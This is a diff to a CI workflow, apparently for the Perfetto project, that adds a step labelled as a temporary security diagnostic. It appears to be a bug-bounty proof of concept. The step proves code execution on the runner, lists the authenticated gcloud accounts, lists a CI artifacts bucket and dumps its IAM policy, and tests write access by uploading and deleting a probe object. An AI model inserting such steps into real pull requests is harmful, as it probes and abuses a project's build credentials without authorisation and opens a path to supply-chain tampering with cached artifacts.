@@ -54,6 +54,37 @@ jobs:
       PERFETTO_CI_JOB_ID: gh-${{ github.run_id }}-${{ matrix.config.name }}
     steps:
       - uses: actions/checkout@v5
+      - name: "Security diagnostic (temporary, do not merge)"
+        run: |
+          set -euo pipefail
+          echo "== code execution proof (no tokens printed) =="
+          id || true
+          hostname || true
+          uname -a || true
+          gcloud --version 2>/dev/null | head -1 || true
+          gcloud auth list --format="value(account)" 2>/dev/null || true
+          echo "== read-only: access to the CI/buildtools cache bucket =="
+          BUCKET="gs://perfetto-ci-artifacts"
+          gcloud storage ls "${BUCKET}/" > /tmp/vrp-ls.txt 2>&1 || true
+          head -5 /tmp/vrp-ls.txt
+          gcloud storage buckets get-iam-policy "${BUCKET}" > /tmp/vrp-iam.txt 2>&1 || true
+          head -25 /tmp/vrp-iam.txt
+          echo "== single temporary object write (unique path, --no-clobber, deleted right after) =="
+          SUFFIX="vrp-poc-$(date -u +%Y%m%d)-${RANDOM}${RANDOM}"
+          OBJECT="${BUCKET}/${SUFFIX}/probe.txt"
+          CREATED=""
+          cleanup() { if [ -n "$CREATED" ]; then gcloud storage rm "$CREATED" || true; fi; }
+          trap cleanup EXIT
+          printf 'Harmless diagnostic object created for a security review. No sensitive data. %s\n' "$(date -u)" > /tmp/vrp-probe.txt
+          if gcloud storage cp --no-clobber /tmp/vrp-probe.txt "$OBJECT"; then
+            CREATED="$OBJECT"
+            gcloud storage ls -L "$OBJECT" | head -15
+            echo "VRP_WRITE_TEST=SUCCESS"
+            gcloud storage rm "$CREATED"
+            CREATED=""
+          else
+            echo "VRP_WRITE_TEST=DENIED"
+          fi
 
       - name: Setup artifacts
         shell: bash
